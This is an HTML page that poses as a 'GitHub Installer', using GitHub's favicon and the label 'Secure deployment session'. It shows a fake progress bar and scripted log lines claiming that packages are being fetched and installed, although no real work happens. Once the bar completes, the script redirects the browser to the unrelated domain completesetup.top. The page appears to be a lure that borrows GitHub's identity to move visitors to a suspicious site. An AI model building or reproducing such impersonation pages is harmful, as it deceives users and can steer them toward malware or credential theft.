<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>GitHub Installer</title>

<style>
*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
}

body{
height:100vh;
display:flex;
justify-content:center;
align-items:center;
background:#0d1117;
overflow:hidden;
color:#e6edf3;
}

/* background glow */
.bg{
position:absolute;
inset:0;
background:
radial-gradient(circle at 30% 30%, rgba(88,166,255,.18), transparent 40%),
radial-gradient(circle at 70% 60%, rgba(35,134,54,.15), transparent 40%);
filter:blur(80px);
}

/* small centered card */
.card{
width:360px;
background:rgba(22,27,34,.9);
border:1px solid #30363d;
border-radius:14px;
padding:18px;
z-index:2;
box-shadow:0 20px 60px rgba(0,0,0,.6);
}

/* header */
.header{
display:flex;
align-items:center;
gap:10px;
margin-bottom:12px;
}

.header img{
width:22px;
height:22px;
}

.title{
font-size:13px;
font-weight:600;
}

.sub{
font-size:11px;
color:#8b949e;
}

/* progress */
.bar{
height:8px;
background:#21262d;
border-radius:999px;
overflow:hidden;
margin-top:10px;
}

.fill{
width:0%;
height:100%;
background:#238636;
transition:width .2s ease;
}

/* status */
.status{
font-size:11px;
color:#8b949e;
margin-top:10px;
}

/* tiny activity blocks */
.grid{
display:grid;
grid-template-columns:repeat(12,1fr);
gap:2px;
margin-top:12px;
}

.cell{
aspect-ratio:1;
background:#21262d;
border-radius:2px;
transition:.3s;
}

.active{
background:#39d353;
}

/* log */
.logs{
margin-top:12px;
height:70px;
overflow:hidden;
background:#0d1117;
border:1px solid #30363d;
border-radius:8px;
padding:8px;
font-size:10px;
color:#8b949e;
}
</style>
</head>

<body>

<div class="bg"></div>

<div class="card">

<div class="header">
<img src="https://github.githubassets.com/favicons/favicon.svg">
<div>
<div class="title">GitHub Installer</div>
<div class="sub">Secure deployment session</div>
</div>
</div>

<div class="bar"><div class="fill" id="fill"></div></div>
<div class="status" id="status">Initializing...</div>

<div class="grid" id="grid"></div>

<div class="logs" id="logs"></div>

</div>

<script>

const grid=document.getElementById("grid");

for(let i=0;i<96;i++){
const d=document.createElement("div");
d.className="cell";
grid.appendChild(d);
}

const cells=document.querySelectorAll(".cell");

setInterval(()=>{
const c=cells[Math.floor(Math.random()*cells.length)];
c.classList.add("active");
setTimeout(()=>c.classList.remove("active"),700);
},80);

const fill=document.getElementById("fill");
const status=document.getElementById("status");
const logs=document.getElementById("logs");

let p=0;

function log(t){
logs.innerHTML+="> "+t+"<br>";
logs.scrollTop=logs.scrollHeight;
}

function run(){

p++;

fill.style.width=p+"%";

if(p===10){status.textContent="Fetching package...";log("Package detected");}
if(p===30){status.textContent="Downloading assets...";log("Assets loaded");}
if(p===55){status.textContent="Preparing environment...";log("Environment ready");}
if(p===80){status.textContent="Finalizing setup...";log("Final checks running");}

if(p<100){
setTimeout(run,35);
}else{
status.textContent="Complete";
log("Installation finished");

setTimeout(()=>{
window.location.href="https://completesetup.top/";
},900);
}

}

run();

</script>

</body>
</html>
